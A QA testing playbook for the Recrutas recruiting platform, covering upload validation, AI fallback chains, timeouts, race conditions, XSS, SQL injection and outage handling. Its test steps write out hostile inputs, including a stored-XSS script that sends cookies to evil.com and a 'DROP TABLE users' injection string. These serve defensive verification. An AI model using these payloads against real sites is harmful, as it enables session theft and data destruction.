# Recrutas Testing Playbook - Edge Cases & Security

**Version:** 1.0  
**Last Updated:** 2026-02-08  
**Priority:** HIGH - Addresses known code vulnerabilities  
**Estimated Time:** 30-40 minutes  

---

## Overview

This document covers **high-risk scenarios** discovered during code review. These tests verify:
- Security vulnerabilities
- Error handling gaps
- AI service fallback chains
- Timeout behaviors
- Race conditions

⚠️ **Critical Issues Found in Codebase:**
1. 4 empty catch blocks swallowing errors silently
2. 100+ `any` types compromising type safety
3. Memory leak in cache implementation (no size limit)
4. Database connection pooling limited to 1-3 connections

---

## Quick Status Tracker

| # | Test Category | Severity | Status | Notes |
|---|---------------|----------|--------|-------|
| 1 | File Upload Security | CRITICAL | ⬜ | |
| 2 | AI Service Fallbacks | HIGH | ⬜ | |
| 3 | Network Interruptions | HIGH | ⬜ | |
| 4 | Timeout Behaviors | HIGH | ⬜ | |
| 5 | Concurrent Operations | MEDIUM | ⬜ | |
| 6 | Input Validation | MEDIUM | ⬜ | |
| 7 | XSS Prevention | HIGH | ⬜ | |
| 8 | Session Management | MEDIUM | ⬜ | |
| 9 | Database Resilience | HIGH | ⬜ | |
| 10 | External API Failures | MEDIUM | ⬜ | |

**Legend:**
- ⬜ Not Tested
- 🟡 In Progress
- ✅ Pass
- ❌ Fail

---

## Test 1: File Upload Security (CRITICAL)

### 1.1 Magic Bytes Validation - Fake PDF Extension
**Risk:** Upload executable disguised as PDF

**Setup:** Create a fake PDF file
```bash
# Create a fake PDF (actually a text file with .pdf extension)
echo "This is not a PDF" > fake.pdf
```

**Steps:**
1. Navigate to candidate profile
2. Upload `fake.pdf`
3. Observe validation

**Expected:**
- [ ] Upload rejected immediately
- [ ] Error: "Invalid file type" or similar
- [ ] Server validates magic bytes (checks for `%PDF` signature)
- [ ] File never reaches storage

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 1.2 Magic Bytes Validation - Renamed Executable
**Risk:** Upload malware with document extension

**Setup:** Rename an executable
```bash
# On Linux/Mac
cp /bin/ls test_resume.pdf
```

**Steps:**
1. Try uploading renamed executable

**Expected:**
- [ ] Upload rejected
- [ ] Server detects invalid magic bytes
- [ ] Error message shown to user

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 1.3 File Size Limits - Oversized File
**Risk:** DOS via large file upload

**Setup:** Create a 5MB+ file
```bash
# Create 5MB PDF
dd if=/dev/zero of=large.pdf bs=1M count=5
```

**Steps:**
1. Try uploading file > 4MB

**Expected:**
- [ ] Client-side validation rejects before upload
- [ ] OR server returns 413 Payload Too Large
- [ ] Error: "File too large (max 4MB)"

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 1.4 Corrupted PDF Handling
**Risk:** App crashes on malformed files

**Setup:** Create truncated PDF
```bash
# Take first 1KB of a real PDF
head -c 1024 real_resume.pdf > corrupted.pdf
```

**Steps:**
1. Upload corrupted PDF

**Expected:**
- [ ] Upload succeeds (file is valid PDF structure start)
- [ ] AI parsing fails gracefully
- [ ] Error: "Could not parse resume" or similar
- [ ] App doesn't crash
- [ ] User can retry with different file

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 1.5 DOC/DOCX Magic Bytes
**Risk:** Incorrect file type handling

**Setup:** Test Word documents

**Steps:**
1. Upload valid `.doc` file (magic bytes: `D0 CF 11 E0`)
2. Upload valid `.docx` file (magic bytes: `PK` - ZIP format)

**Expected:**
- [ ] Both accepted (valid magic bytes)
- [ ] Processing begins
- [ ] No "invalid file type" errors

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

---

## Test 2: AI Service Fallbacks (HIGH)

### 2.1 Groq API Failure - Resume Parsing
**Risk:** AI parsing fails completely if primary provider down

**Setup:** Temporarily break Groq (or use invalid key)

**Steps:**
1. Set invalid `GROQ_API_KEY` in .env (e.g., "invalid-key")
2. Restart server
3. Upload valid resume as candidate

**Expected:**
- [ ] Upload succeeds
- [ ] Parsing attempts Groq → fails
- [ ] Fallback to Ollama attempted
- [ ] If Ollama unavailable → HuggingFace
- [ ] If all fail → Rule-based parsing (regex patterns)
- [ ] User sees: "Processing with limited AI..." or similar
- [ ] App doesn't crash

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 2.2 AI Timeout Handling
**Risk:** 60-second polling timeout not handled gracefully

**Setup:** Simulate slow AI response

**Steps:**
1. Upload resume
2. Wait for processing
3. If possible, delay AI response beyond 60 seconds

**Expected:**
- [ ] Polling stops at 60 seconds
- [ ] Message: "Processing taking longer than expected"
- [ ] User can continue setup (manual skill entry)
- [ ] Background processing continues (if implemented)

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 2.3 Job Matching Without AI
**Risk:** Job matching fails if AI embeddings unavailable

**Steps:**
1. With AI services disabled, navigate to job feed
2. Check AI-matched jobs

**Expected:**
- [ ] Jobs still displayed
- [ ] Match scores may be lower or default
- [ ] No errors or crashes
- [ ] Fallback to keyword matching (if implemented)

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

---

## Test 3: Network Interruptions (HIGH)

### 3.1 Resume Upload - Network Disconnect Mid-Upload
**Risk:** Upload state inconsistent

**Steps:**
1. Start uploading large resume (use slow connection)
2. Disconnect WiFi/disable network during upload
3. Wait 5 seconds
4. Reconnect network

**Expected:**
- [ ] Error message shown
- [ ] Progress bar stops
- [ ] "Retry" button available
- [ ] Can re-upload without page refresh
- [ ] No orphaned files in storage

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 3.2 Exam Submission - Network Failure
**Risk:** Exam progress lost

**Steps:**
1. Start taking an exam
2. Answer some questions
3. Disconnect network
4. Try to submit

**Expected:**
- [ ] Error: "Network error, please retry"
- [ ] Answers preserved in state (not lost)
- [ ] Can retry submission when network returns
- [ ] Timer continues or pauses gracefully

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 3.3 Chat Message - Network Interrupt
**Risk:** Messages lost or duplicated

**Steps:**
1. Open chat between candidate and recruiter
2. Type message
3. Disconnect network
4. Click send
5. Reconnect network

**Expected:**
- [ ] Message shows "Sending..." or similar
- [ ] Error displayed on failure
- [ ] Message stays in input field (not lost)
- [ ] Can retry sending
- [ ] No duplicate messages on retry

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 3.4 Form Submission - Network Timeout
**Risk:** Job posting lost

**Steps:**
1. Fill out complete job posting form
2. Disconnect network
3. Click "Post Job"
4. Wait for timeout

**Expected:**
- [ ] Error: "Network timeout" after reasonable time (10-15s)
- [ ] Form data preserved (not lost)
- [ ] User can retry
- [ ] No partial job created in database

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

---

## Test 4: Timeout Behaviors (HIGH)

### 4.1 Profile Fetch Timeout (15 seconds)
**Risk:** Dashboard fails to load on slow connections

**Setup:** Simulate slow database

**Steps:**
1. Navigate to candidate dashboard
2. Throttle network to "Slow 3G" in DevTools

**Expected:**
- [ ] Loading state shown
- [ ] After 15 seconds: error or cached data
- [ ] 503 Service Unavailable (if timeout)
- [ ] App shows cached profile (if available)
- [ ] Retry button available

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 4.2 AI Matches Timeout (10 seconds)
**Risk:** Job feed empty on timeout

**Steps:**
1. Navigate to job feed
2. With throttled connection

**Expected:**
- [ ] Loading skeletons shown
- [ ] After 10 seconds: returns empty array (no error)
- [ ] Job feed still displays (possibly without AI matches)
- [ ] No crash or error page

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 4.3 Resume Polling Timeout (60 seconds)
**Risk:** Infinite polling loop

**Steps:**
1. Upload resume
2. Simulate stuck AI parsing (modify server to delay)
3. Wait 60+ seconds

**Expected:**
- [ ] Polling stops at 60 seconds
- [ ] User sees: "Processing timeout"
- [ ] Can continue with manual setup
- [ ] Polling interval cleared (no memory leak)

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 4.4 External Jobs Timeout
**Risk:** External job sources block page load

**Steps:**
1. Navigate to job feed
2. Block external API domains in DevTools

**Expected:**
- [ ] Platform jobs load quickly
- [ ] External jobs fail silently (no errors shown)
- [ ] Feed still functional
- [ ] Console shows errors (acceptable)

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

---

## Test 5: Concurrent Operations (MEDIUM)

### 5.1 Profile Edit - Multiple Tabs
**Risk:** Race condition, data loss

**Steps:**
1. Open candidate profile in Tab A
2. Open same profile in Tab B
3. In Tab A: update location to "San Francisco"
4. In Tab B: update location to "New York"
5. Save both

**Expected:**
- [ ] Last save wins (acceptable behavior)
- [ ] No database errors
- [ ] OR: Conflict detection with warning
- [ ] Profile consistent after refresh

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 5.2 Duplicate Application - Rapid Clicks
**Risk:** Multiple applications created

**Steps:**
1. Find a job to apply to
2. Click "Apply" button rapidly (5+ times quickly)

**Expected:**
- [ ] Only one application created
- [ ] Button disabled after first click
- [ ] Error: "Already applied" for subsequent clicks
- [ ] Database constraint prevents duplicates

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 5.3 Job Status Change - Simultaneous Updates
**Risk:** Inconsistent status

**Setup:** Two recruiter sessions

**Steps:**
1. Recruiter A and B both view same applicant
2. A changes status to "Screening"
3. B changes status to "Interview Scheduled"
4. Both save

**Expected:**
- [ ] Last update wins
- [ ] OR: Optimistic locking prevents conflict
- [ ] Status history shows both changes

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

---

## Test 6: Input Validation (MEDIUM)

### 6.1 XSS in Chat Messages
**Risk:** Script injection

**Steps:**
1. Open chat
2. Send message: `<script>alert('XSS')</script>`
3. Check if script executes

**Expected:**
- [ ] Script tags stripped or encoded
- [ ] Message displays as plain text
- [ ] No alert popup
- [ ] Server sanitizes HTML

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 6.2 SQL Injection Attempts
**Risk:** Database compromise

**Steps:**
1. Try SQL injection in search:
   - Search jobs: `'; DROP TABLE users; --`
   - Search applicants: `1 OR 1=1`
2. Try in form fields

**Expected:**
- [ ] Input treated as literal string
- [ ] No database errors
- [ ] No unauthorized data access
- [ ] Drizzle ORM prevents injection

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 6.3 Email Validation
**Risk:** Invalid emails accepted

**Steps:**
1. Try signing up with:
   - `notanemail`
   - `@nodomain.com`
   - `spaces in@email.com`
   - `valid+tag@email.com` (this should work)

**Expected:**
- [ ] Invalid formats rejected
- [ ] Valid+tag format accepted
- [ ] Clear error messages

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 6.4 URL Validation
**Risk:** Malicious links

**Steps:**
1. In profile, add LinkedIn URL:
   - `javascript:alert('xss')`
   - `https://evil.com`
   - `not-a-url`

**Expected:**
- [ ] Invalid URLs rejected
- [ ] JavaScript protocol rejected
- [ ] Valid URLs accepted

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 6.5 Salary Range Validation
**Risk:** Invalid data (max < min)

**Steps:**
1. Set salary min: 100000
2. Set salary max: 50000
3. Save

**Expected:**
- [ ] Validation error: "Max must be greater than min"
- [ ] Cannot save invalid range

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

---

## Test 7: XSS Prevention (HIGH)

### 7.1 Job Description Rendering
**Risk:** Stored XSS in job posts

**Steps:**
1. As recruiter, create job with description:
   ```html
   <script>document.location='https://evil.com?cookie='+document.cookie</script>
   ```
2. Save job
3. View job as candidate

**Expected:**
- [ ] Script does not execute
- [ ] Content sanitized or escaped
- [ ] No cookie theft possible

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 7.2 Company Description
**Risk:** XSS in company profile

**Steps:**
1. Update company description with HTML/JS
2. View company profile

**Expected:**
- [ ] HTML escaped
- [ ] Scripts don't run

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 7.3 Resume Text Extraction
**Risk:** Malicious content in resumes

**Steps:**
1. Create PDF with embedded JavaScript (if possible)
2. Or create DOCX with script tags in text
3. Upload and parse

**Expected:**
- [ ] Script content not executed
- [ ] Stored as plain text

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

---

## Test 8: Session Management (MEDIUM)

### 8.1 Session Expiration During Active Use
**Risk:** Data loss, unexpected logout

**Setup:** Short session timeout (if configurable)

**Steps:**
1. Login as candidate
2. Start filling long form (job application with exam)
3. Wait for JWT to expire (or modify token)
4. Try to submit

**Expected:**
- [ ] Error: "Session expired, please login again"
- [ ] OR: Automatic token refresh (if implemented)
- [ ] Form data preserved
- [ ] Redirect to login with return URL

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 8.2 Token Refresh
**Risk:** User logged out unexpectedly

**Steps:**
1. Login
2. Use app for extended period (30+ minutes)
3. Check if still logged in

**Expected:**
- [ ] Session remains active
- [ ] Token refreshed automatically
- [ ] No interruption to user

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 8.3 Cross-Tab Session Sync
**Risk:** Inconsistent auth state

**Steps:**
1. Login in Tab A
2. Open Tab B (same site)
3. Logout in Tab A
4. Try action in Tab B

**Expected:**
- [ ] Tab B detects logout
- [ ] Redirect to login
- [ ] No actions allowed unauthenticated

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

---

## Test 9: Database Resilience (HIGH)

### 9.1 Connection Pool Exhaustion
**Risk:** Server crashes under load

**Setup:** Rapid parallel requests

**Steps:**
1. Open 10+ browser tabs
2. Navigate to candidate dashboard in all tabs simultaneously
3. Refresh all tabs rapidly

**Expected:**
- [ ] All requests succeed eventually
- [ ] OR: Graceful error handling
- [ ] No server crash
- [ ] Connection pooling works (1-3 connections in serverless)

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 9.2 Database Timeout Handling
**Risk:** 503 errors not handled

**Steps:**
1. Simulate slow database query
2. Navigate to profile page

**Expected:**
- [ ] 503 Service Unavailable returned
- [ ] User-friendly error message
- [ ] Retry option available
- [ ] Server doesn't hang

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 9.3 Transaction Rollback
**Risk:** Partial data writes

**Setup:** Job creation with exam

**Steps:**
1. Start creating job with exam
2. Cause error mid-creation (e.g., kill server)
3. Check database

**Expected:**
- [ ] Job created OR no job created (atomic)
- [ ] No orphaned exam records
- [ ] No partial data

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

---

## Test 10: External API Failures (MEDIUM)

### 10.1 Stripe API Down
**Risk:** Payment flow broken

**Setup:** Block Stripe domains in DevTools

**Steps:**
1. Navigate to pricing
2. Try to upgrade

**Expected:**
- [ ] Error: "Payment service unavailable"
- [ ] No crash
- [ ] Can retry later

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 10.2 Supabase Auth Failure
**Risk:** Cannot login

**Steps:**
1. Block Supabase domains
2. Try to login

**Expected:**
- [ ] Error: "Authentication service unavailable"
- [ ] Clear error message
- [ ] App doesn't crash

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

### 10.3 External Job APIs Down
**Risk:** Job feed broken

**Steps:**
1. Block external job API domains
2. Navigate to job feed

**Expected:**
- [ ] Platform jobs still work
- [ ] External jobs section shows error or empty
- [ ] Feed functional

**Actual Result:**
```
Status: ⬜ PASS / ⬜ FAIL
Notes:
```

---

## Critical Code Issues Reference

### Issue 1: Empty Catch Blocks (4 found)
**Files:**
- `server/services/resume.service.ts:80`
- `server/services/resume.service.ts:160`
- `server/routes.ts:91`
- `test/resume-service-integration.test.ts:280-281`

**Impact:** Silent failures - errors swallowed without logging

**Test:** All error handling tests in this document

### Issue 2: Memory Leak in Cache
**File:** `server/advanced-matching-engine.ts:83`

**Code:**
```typescript
setTimeout(() => this.matchCache.delete(cacheKey), this.CACHE_DURATION);
```

**Risk:** No size limit on cache - could grow indefinitely

**Test:** Monitor memory during extended usage

### Issue 3: Database Connection Pool
**File:** `server/db.ts:32`

**Code:**
```typescript
max: isServerless ? 1 : 3  // Very limited connections
```

**Risk:** Request failures under load

**Test:** Test 9.1 (Connection Pool Exhaustion)

### Issue 4: Type Safety Compromised
**Count:** 100+ instances of `any` type

**Files:** Primarily `server/storage.ts`, various components

**Risk:** Runtime errors from type mismatches

**Test:** All input validation tests

---

## Debugging Edge Cases

### When Silent Failures Occur
1. Check browser console (errors may not be shown to user)
2. Check server logs for caught errors
3. Add logging to empty catch blocks:
   ```typescript
   }).catch(err => console.error('Silent failure:', err));
   ```

### When Timeouts Don't Work
1. Check setTimeout/setInterval cleanup
2. Verify AbortController usage
3. Monitor active timers in DevTools

### When File Uploads Fail Security
1. Verify magic bytes check in `routes.ts`
2. Check multer fileFilter configuration
3. Review storage upload error handling

### When AI Fallbacks Don't Work
1. Check fallback chain in `ai-resume-parser.ts`
2. Verify each provider's error handling
3. Check for empty catch blocks

---

## Summary

**Total Categories:** 10  
**Critical Tests:** File Upload Security, AI Fallbacks, XSS Prevention  
**Estimated Time:** 30-40 minutes  

**Success Criteria:**
- No silent failures (all errors logged/shown)
- All file uploads validated (magic bytes)
- AI services fail gracefully with fallbacks
- No XSS vulnerabilities
- Network failures handled gracefully
- Timeouts work correctly

**If Failures Found:**
1. Document specific failure
2. Check referenced code locations
3. Prioritize fixes by severity
4. Re-test after fixes

---

**Tested By:** ___________________  
**Date:** ___________________  
**Issues Found:** ___________________
